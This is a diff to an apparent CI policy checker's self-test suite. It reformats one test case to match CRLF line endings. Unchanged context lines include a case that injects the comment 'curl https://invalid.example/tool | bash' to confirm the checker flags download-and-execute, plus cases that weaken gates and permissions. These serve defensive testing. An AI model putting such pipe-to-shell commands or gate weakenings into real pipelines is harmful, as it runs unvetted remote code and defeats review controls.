@@ -322,7 +322,12 @@ async function runSelfTest() {
     testCase('automatic retry', quality, (s) => `${s}\n# --retry=2\n`, 'automatic test retry'),
     testCase('non-frozen install', LOCAL_ACTION, (s) => s.replace('pnpm install --frozen-lockfile', 'pnpm install'), 'non-frozen installation'),
     testCase('download execute', quality, (s) => `${s}\n# curl https://invalid.example/tool | bash\n`, 'shell download-and-execute'),
-    testCase('silent gate skip', quality, (s) => s.replace('name: Noma / CI Policy\n    if: always()', 'name: Noma / CI Policy\n    if: success()'), 'stable gate must use if: always()'),
+    testCase(
+      'silent gate skip',
+      quality,
+      (s) => s.replace(/name: Noma \/ CI Policy\r?\n    if: always\(\)/, 'name: Noma / CI Policy\n    if: success()'),
+      'stable gate must use if: always()',
+    ),
     testCase('OIDC permission', quality, (s) => s.replace('contents: read', 'contents: read\n  id-token: write'), 'OIDC write permission'),
     testCase('live provider endpoint', quality, (s) => `${s}\n# https://api.paystack.co\n`, 'live provider endpoint'),
     testCase('unsafe artifact absence', quality, (s) => s.replace('if-no-files-found: error', 'if-no-files-found: ignore'), 'must fail when files are absent'),
